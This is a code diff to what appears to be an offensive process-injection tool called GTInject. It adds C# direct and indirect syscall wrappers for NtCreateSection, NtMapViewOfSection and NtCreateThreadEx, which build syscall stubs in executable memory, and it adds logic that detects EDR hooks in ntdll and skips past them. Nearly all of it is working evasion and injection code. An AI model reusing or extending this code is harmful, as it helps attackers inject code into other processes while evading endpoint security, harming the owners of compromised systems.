@@ -43,6 +43,10 @@ namespace GTInject.SysCalls
 	        0x41, 0xFF, 0xE3 				       	                    // jmp r11
         };
 
+        ////////////////////////////
+        // Direct Syscalls
+        ////////////////////////////
+
         // Review if the RWX here matters - could see about RX changes if that would be better / possible, step through this. 
         public static WinNative.NTSTATUS SysclNtOpenProcess(ref IntPtr ProcessHandle, UInt32 AccessMask, ref SysCalls.WinNative.OBJECT_ATTRIBUTES ObjectAttributes, ref SysCalls.WinNative.CLIENT_ID ClientId)
         {
@@ -166,43 +170,6 @@ namespace GTInject.SysCalls
         }
 
 
-        public static SysCalls.WinNative.NTSTATUS IndirectSysclNtCreateThreadEx(out IntPtr threadHandle, WinNative.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList)
-        {
-            Console.WriteLine("attach debugger");
-            Console.ReadLine();
-            // dynamically resolve the syscall
-            byte[] syscall = bIndirectSysCallStub;
-            IntPtr syscallMemAddr;
-            (syscall[4],syscallMemAddr) = GetIndirectSysCall("NtCreateThreadEx");
-            var syscallmemstring = string.Format("{0:X2}", syscallMemAddr.ToInt64());
-            Console.WriteLine(syscallmemstring);
-            byte[] syscallInstructionSuffix = StringToByteArray(string.Format("{0:X2}", syscallMemAddr.ToInt64()));
-            byte[] syscallInstructionPrefix = new byte[2] { 0x00, 0x00 };
-            byte[] syscallInstruction = new byte[syscallInstructionPrefix.Length + syscallInstructionSuffix.Length];
-            System.Buffer.BlockCopy(syscallInstructionPrefix, 0, syscallInstruction, 0, syscallInstructionPrefix.Length);
-            System.Buffer.BlockCopy(syscallInstructionSuffix, 0, syscallInstruction, syscallInstructionPrefix.Length, syscallInstructionSuffix.Length);
-            Console.WriteLine(ByteArrayToString(syscallInstruction));
-            Array.Reverse(syscallInstruction, 0, syscallInstruction.Length);
-            System.Buffer.BlockCopy(syscallInstruction, 0, syscall, 10, syscallInstruction.Length);
-            Console.WriteLine(ByteArrayToString(syscall));
-
-            unsafe
-            {
-                fixed (byte* ptr = syscall)
-                {
-                    IntPtr memoryAddress = (IntPtr)ptr;
-
-                    if (!WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
-                    {
-                        throw new Win32Exception();
-                    }
-
-                    Delegates.DelgNtCreateThreadEx assembledFunction = (Delegates.DelgNtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtCreateThreadEx));
-
-                    return (SysCalls.WinNative.NTSTATUS)assembledFunction(out threadHandle, desiredAccess, objectAttributes, processHandle, startAddress, parameter, createSuspended, stackZeroBits, sizeOfStack, maximumStackSize, attributeList);
-                }
-            }
-        }
 
         public static SysCalls.WinNative.NTSTATUS SysclNtQueueApcThread(IntPtr ThreadHandle, IntPtr ApcRoutine, UInt32 ApcRoutineContext, IntPtr ApcStatusBlock, Int32 ApcReserved)
         {
@@ -252,6 +219,99 @@ namespace GTInject.SysCalls
             }
         }
 
+
+        public static SysCalls.WinNative.NTSTATUS SysclNtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle)
+        {
+            // dynamically resolve the syscall
+            byte[] syscall = bDirectSysCallStub;
+            syscall[4] = GetSysCallId("NtCreateSection");
+
+            unsafe
+            {
+                fixed (byte* ptr = syscall)
+                {
+                    IntPtr memoryAddress = (IntPtr)ptr;
+
+                    if (!WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
+                    {
+                        throw new Win32Exception();
+                    }
+
+                    Delegates.DelgNtCreateSection assembledFunction = (Delegates.DelgNtCreateSection)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtCreateSection));
+
+                    return (SysCalls.WinNative.NTSTATUS)assembledFunction(ref SectionHandle, DesiredAccess, ObjectAttributes, ref MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle);
+                }
+            }
+        }
+
+        public static SysCalls.WinNative.NTSTATUS SysclNtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, out ulong SectionOffset, out int ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect)
+        {
+            // dynamically resolve the syscall
+            byte[] syscall = bDirectSysCallStub;
+            syscall[4] = GetSysCallId("NtMapViewOfSection");
+
+            unsafe
+            {
+                fixed (byte* ptr = syscall)
+                {
+                    IntPtr memoryAddress = (IntPtr)ptr;
+
+                    if (!WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
+                    {
+                        throw new Win32Exception();
+                    }
+
+                    Delegates.DelgNtMapViewOfSection assembledFunction = (Delegates.DelgNtMapViewOfSection)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtMapViewOfSection));
+
+                    return (SysCalls.WinNative.NTSTATUS)assembledFunction( SectionHandle,  ProcessHandle, ref  BaseAddress,  ZeroBits,  CommitSize, out  SectionOffset, out  ViewSize,  InheritDisposition,  AllocationType,  Win32Protect);
+                }
+            }
+        }
+
+        ////////////////////////////
+        // Indirect Syscalls
+        ////////////////////////////
+
+        public static SysCalls.WinNative.NTSTATUS IndirectSysclNtCreateThreadEx(out IntPtr threadHandle, WinNative.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList)
+        {
+
+            // dynamically resolve the syscall
+            byte[] syscall = bIndirectSysCallStub;
+            IntPtr syscallMemAddr;
+            (syscall[4], syscallMemAddr) = GetIndirectSysCall("NtCreateThreadEx");
+            var syscallmemstring = string.Format("{0:X2}", syscallMemAddr.ToInt64());
+            //Console.WriteLine(syscallmemstring);
+            byte[] syscallInstructionSuffix = StringToByteArray(string.Format("{0:X2}", syscallMemAddr.ToInt64()));
+            byte[] syscallInstructionPrefix = new byte[2] { 0x00, 0x00 };
+            byte[] syscallInstruction = new byte[syscallInstructionPrefix.Length + syscallInstructionSuffix.Length];
+            System.Buffer.BlockCopy(syscallInstructionPrefix, 0, syscallInstruction, 0, syscallInstructionPrefix.Length);
+            System.Buffer.BlockCopy(syscallInstructionSuffix, 0, syscallInstruction, syscallInstructionPrefix.Length, syscallInstructionSuffix.Length);
+            //Console.WriteLine(ByteArrayToString(syscallInstruction));
+            Array.Reverse(syscallInstruction, 0, syscallInstruction.Length);
+            System.Buffer.BlockCopy(syscallInstruction, 0, syscall, 10, syscallInstruction.Length);
+            //Console.WriteLine(ByteArrayToString(syscall));
+
+            unsafe
+            {
+                fixed (byte* ptr = syscall)
+                {
+                    IntPtr memoryAddress = (IntPtr)ptr;
+
+                    if (!WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
+                    {
+                        throw new Win32Exception();
+                    }
+
+                    Delegates.DelgNtCreateThreadEx assembledFunction = (Delegates.DelgNtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtCreateThreadEx));
+
+                    return (SysCalls.WinNative.NTSTATUS)assembledFunction(out threadHandle, desiredAccess, objectAttributes, processHandle, startAddress, parameter, createSuspended, stackZeroBits, sizeOfStack, maximumStackSize, attributeList);
+                }
+            }
+        }
+
+        ////////////////////////////
+        // Other Functions
+        ////////////////////////////
         private static IntPtr GetNtdllBaseAddress()
         {
             Process hProc = Process.GetCurrentProcess();
@@ -282,10 +342,12 @@ namespace GTInject.SysCalls
                 bool hooked = false;
 
                 var instructions = new byte[5];
+                Marshal.Copy(funcAddress, instructions, 0, 5);
                 // Edited to the 4th byte - found some EDRs jmp after the initial mov r10, rcx, should consider that hooked
                 if (!StructuralComparisons.StructuralEqualityComparer.Equals(new byte[4] { instructions[0], instructions[1], instructions[2], instructions[3] }, new byte[4] { 0x4C, 0x8B, 0xD1, 0xB8 }))
                 {
                     hooked = true;
+                    Console.WriteLine("     {0} was hooked, moving to the next index", FunctionName);
                 }
 
                 if (!hooked)
@@ -296,6 +358,11 @@ namespace GTInject.SysCalls
 
                 funcAddress = (IntPtr)((UInt64)funcAddress + ((UInt64)32));
                 count++;
+                if (count > 2500)
+                {
+                    Console.WriteLine("     This is a failure, but don't infinite loop.. not again");
+                    return (byte)0;
+                }
             }
         }
 
@@ -330,12 +397,17 @@ namespace GTInject.SysCalls
                     byte sysId = (byte)(instructions[4] - count);
                     Console.WriteLine("     Syscall ID dynamically resolved {1} to {0:X2}", sysId, FunctionName);
                     IntPtr syscallInstruction = (IntPtr)((UInt64)funcAddress + (UInt64)distance_to_syscall);
-                    Console.WriteLine("Syscall instruction address " + syscallInstruction);
+                    Console.WriteLine("     Syscall instruction address " + syscallInstruction);
                     return (sysId, syscallInstruction);
                 }
 
                 funcAddress = (IntPtr)((UInt64)funcAddress + ((UInt64)32));
                 count++;
+                if (count > 2500)
+                {
+                    Console.WriteLine("     This is a failure, but don't infinite loop.. not again");
+                    return ((byte)0, IntPtr.Zero);
+                }
             }
         }
 
@@ -383,6 +455,19 @@ namespace GTInject.SysCalls
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
             public delegate
             SysCalls.WinNative.NTSTATUS DelgNtResumeThread(IntPtr hThread, uint dwSuspendCount);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate
+            SysCalls.WinNative.NTSTATUS DelgNtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate
+            SysCalls.WinNative.NTSTATUS DelgNtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, out ulong SectionOffset, out int ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate
+            SysCalls.WinNative.NTSTATUS DelgRtlCopyMemory(IntPtr dest, IntPtr src, uint length);
+
 
         };
 
